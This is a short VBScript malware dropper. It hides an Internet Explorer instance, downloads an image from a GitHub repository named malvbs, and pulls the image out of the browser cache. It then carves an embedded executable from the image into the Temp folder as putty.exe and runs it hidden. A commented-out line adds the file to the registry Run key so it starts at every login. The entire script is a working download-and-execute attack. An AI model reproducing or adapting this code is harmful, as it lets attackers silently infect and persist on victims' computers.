' Created by NukeDuk

Set oShell = CreateObject("WScript.Shell")
HomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")

Set IE = CreateObject("InternetExplorer.Application")
IE.Visible = False
IE.Navigate "https://github.com/nukeduk/malvbs/blob/master/lord.jpg?raw=true"

Set fso = CreateObject("Scripting.FileSystemObject")
finder fso.GetFolder(HomeFolder+"\AppData\Local\Microsoft\Windows\INetCache\Low\IE")

Sub finder(fldr)
  For Each f In fldr.Files
    If LCase(f.Name) = "lord[1].jpg" Then
      f.copy HomeFolder+"\AppData\Local\Temp\lord.jpg"
      Set f1 = fso.OpenTextFile(HomeFolder+"\AppData\Local\Temp\lord.jpg")
      f1.skip(4682)
      bufor = f1.Read(854072)
      f1.Close
      Set f2 = fso.CreateTextFile(HomeFolder+"\AppData\Local\Temp\putty.exe", True)
      f2.Write(bufor)
      f2.Close
      Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
      obj.Document.Application.ShellExecute "putty.exe",Null,HomeFolder+"\AppData\Local\Temp",Null,0
    End If
  Next
  For Each sf In fldr.SubFolders
    finder sf
  Next
End Sub

'Set WshShell = CreateObject("WScript.Shell")
'WshShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\malw", "tujestmalware", "REG_SZ"